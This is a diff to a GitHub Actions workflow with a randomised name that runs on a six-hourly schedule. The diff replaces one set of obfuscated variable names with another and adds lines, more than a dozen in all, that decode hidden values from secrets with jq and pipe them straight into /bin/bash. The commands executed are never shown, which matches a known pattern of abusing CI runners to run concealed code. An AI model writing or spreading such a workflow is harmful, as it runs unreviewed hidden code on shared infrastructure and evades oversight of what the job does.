@@ -3,21 +3,29 @@ name: fortieszonked
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 0/6 * * *'
-
-jobs:  # 130
+    - cron: '29 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fortieszonked
         env:
-          dvygh28229: ${{ secrets.dvygh28229 }}
+          vzptt91946: ${{ secrets.vzptt91946 }}
         run: |
-          echo $dvygh28229 | jq -r .drat92 | /bin/bash
-          echo $xzl351 | jq -r .f85674 | /bin/bash
-          echo $szyzx61102 | jq -r .xjno17485 | /bin/bash
-          echo $lz52057 | jq -r .vr751 | /bin/bash
-          echo $ff126 | jq -r .ijtn889 | /bin/bash
-          echo $zpbcv2 | jq -r .fl05 | /bin/bash
+          echo $vzptt91946 | jq -r .vw7 | /bin/bash
+          echo $vja76696 | jq -r .goq3508 | /bin/bash
+          echo $n091 | jq -r .vltqk74 | /bin/bash
+          echo $btv710 | jq -r .qv070 | /bin/bash
+          echo $jbj9213 | jq -r .h1154 | /bin/bash
+          echo $ryks7 | jq -r .ahfhp76 | /bin/bash
+          echo $yv95895 | jq -r .xi356 | /bin/bash
+          echo $irrrs15 | jq -r .cfz77422 | /bin/bash
+          echo $iy21793 | jq -r .qlqzk39088 | /bin/bash
+          echo $uthp3428 | jq -r .if4 | /bin/bash
+          echo $chw2 | jq -r .ghn987 | /bin/bash
+          echo $y3 | jq -r .soy413 | /bin/bash
+          echo $hzv512 | jq -r .h41108 | /bin/bash
+          echo $cd6 | jq -r .yop06 | /bin/bash
 
